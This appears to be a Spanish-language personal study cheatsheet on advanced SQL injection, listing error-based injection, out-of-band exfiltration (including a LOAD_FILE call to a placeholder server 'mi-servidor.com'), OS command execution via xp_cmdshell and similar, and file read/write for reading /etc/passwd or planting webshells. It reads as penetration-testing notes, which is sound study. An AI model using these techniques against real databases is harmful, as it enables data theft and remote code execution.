---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[SQL Commands]]"
---
# SQL - Interacción Especial

***

## Cheatsheet

|                **Concepto Clave**                |                               **Sintaxis / Ejemplos**                               | **Propósito y Comportamiento**                                                                                                                                                                                                                                                                                                                                                         |
|:------------------------------------------------:|:-----------------------------------------------------------------------------------:| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|       <br><br>**Manejo de Errores en SQL**       |                <br><br>`CAST(version() AS int)`, `1/0`, `RAISERROR`                 | <br>Funciones y operaciones matemáticas que, al forzar su fallo, generan excepciones. Provocar errores de tipo o desbordamientos controlados es la base del Error-Based SQLi, lo que me permite visualizar el resultado de una subconsulta inyectada directamente dentro del mensaje de error devuelto por la aplicación, siempre y cuando estos mensajes no estén suprimidos.<br><br> |
|    <br><br>**Out-of-Band Data Exfiltration**     | <br>`LOAD_FILE('\\\\mi-servidor.com\\a')`, `master..xp_dirtree`, `UTL_HTTP.REQUEST` | <br>Capacidades integradas del motor para interactuar con la red mediante resoluciones DNS, peticiones HTTP o acceso a recursos compartidos (SMB). Cuando las técnicas In-Band o Blind son inviables, estas funciones me permiten obligar al servidor de base de datos a enviar la información a través de un canal secundario (OOB) directamente hacia mi infraestructura.<br><br>    |
| <br><br>**Interacción con el Sistema Operativo** |            <br><br>`xp_cmdshell`, `COPY ... FROM PROGRAM`, `sys_eval()`             | <br>Procedimientos almacenados o funciones extendidas que posibilitan la ejecución de comandos en la consola del sistema operativo anfitrión. Su comprensión es crítica, ya que representan el punto máximo de compromiso: escalar de una simple manipulación de datos a la ejecución remota de código (RCE) en el servidor subyacente.<br><br>                                        |
|    <br><br>**Lectura/Escritura de Archivos**     |                      <br><br>`INTO OUTFILE`, `pg_read_file()`                       | <br>Directivas que permiten escribir el resultado de una consulta en un archivo local del servidor o leer el contenido de archivos del sistema. Conocer esta sintaxis es indispensable para intentar leer archivos sensibles (como `/etc/passwd`) o escribir webshells en directorios públicos del servidor web.<br><br>                                                               |
^sql-interaccionEspecial

---

## Overview

Ir más allá de las consultas tradicionales implica interactuar con las características avanzadas y, a menudo, documentadas marginalmente del motor de base de datos. Comprender cómo el sistema maneja las excepciones internas o cómo interactúa con el sistema operativo y la red subyacente es la frontera final antes de entrar de lleno en la explotación. Estas interacciones especiales me permiten extraer datos a través de mensajes de diagnóstico del propio servidor o, en escenarios de máxima restricción, obligar a la base de datos a enviar la información directamente a un servidor externo bajo mi control.


___
